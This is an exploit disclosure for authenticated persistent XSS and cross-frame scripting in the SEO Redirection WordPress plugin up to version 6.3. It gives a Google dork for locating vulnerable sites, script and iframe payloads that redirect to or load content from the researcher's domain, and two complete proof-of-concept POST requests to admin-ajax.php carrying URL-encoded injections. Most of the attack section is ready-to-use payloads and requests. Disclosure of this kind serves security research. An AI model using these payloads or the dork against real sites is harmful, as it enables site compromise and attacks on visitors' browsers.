/*!
- # VULNERABILITY: SEO Redirection WordPress Plugin <= 6.3 - Authenticated Persistent XSS & XFS
- # GOOGLE DORK: inurl:/wp-content/plugins/seo-redirection/
- # DATE: 2020-12-28
- # SECURITY RESEARCHER: m0ze [ https://m0ze.ru ]
- # VENDOR: Fakhri Alsadi [ https://www.clogica.com ]
- # SOFTWARE VERSION: <= 6.3
- # SOFTWARE LINK: https://wordpress.org/plugins/seo-redirection/
- # CVSS: AV:N/AC:L/PR:H/UI:N/S:C
- # CWE: CWE-79
- # CVE: N/A
*/



### -- [ Info: ]

[i] An Authenticated Persistent XSS & XFS vulnerabilities was discovered in the SEO Redirection plugin through v6.3 for WordPress.

[i] Vulnerable parameter(s): &redirect_from= and &redirect_to=.

[i] Plugin(s) affected: SEO Redirection Pro by Fakhri Alsadi [ https://codecanyon.net/user/fakhri ]



### -- [ Impact: ]

[~] Malicious JavaScript code or iFrame injections, the ability to combine attack vectors against the targeted system, which can lead to a complete compromise of the resource.



### -- [ Payloads: ]

[$] /<script>alert(`m0ze`);top.location=`//m0ze.ru`;</script>

[$] /<iframe src=https://m0ze.ru/payload/xfsii.html></iframe>



### -- [ PoC #1 | Authenticated Persistent XSS & XFS | Redirect from: ]

[!] POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 481
Cookie: [admin cookies]

action=customAddUpdate&formData=enabled%3D1%26redirect_from_type%3DPage%26redirect_from%3D%252F%253Cscript%253Ealert(%2560m0ze%2560)%253Btop.location%253D%2560%252F%252Fm0ze.ru%2560%253B%253C%252Fscript%253E%26redirect_from_folder_settings%3D1%26redirect_from_subfolders%3D0%26redirect_to_type%3DPage%26redirect_to%3D%252F%252Fm0ze.ru%26redirect_to_folder_settings%3D1%26redirect_type%3D301%26_wpnonce%3D88a432b100%26edit%3D%26add_new%3D1%26edit_exist%3D%26action%3DcustomAddUpdate



### -- [ PoC #2 | Authenticated Persistent XSS & XFS | Redirect to: ]

[!] POST /wp-admin/admin-ajax.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 474
Cookie: [admin cookies]

action=customAddUpdate&formData=enabled%3D1%26redirect_from_type%3DPage%26redirect_from%3D%252F%252Fm0ze.com%26redirect_from_folder_settings%3D1%26redirect_from_subfolders%3D0%26redirect_to_type%3DPage%26redirect_to%3D%252F%253Ciframe%2520src%253Dhttps%253A%252F%252Fm0ze.ru%252Fpayload%252Fxfsii.html%253E%253C%252Fiframe%253E%26redirect_to_folder_settings%3D1%26redirect_type%3D301%26_wpnonce%3D88a432b100%26edit%3D%26add_new%3D1%26edit_exist%3D%26action%3DcustomAddUpdate



### -- [ Contacts: ]

[+] Website: m0ze.ru
[+] GitHub: @m0ze
[+] Telegram: @m0ze_ru
[+] Twitter: @vladm0ze
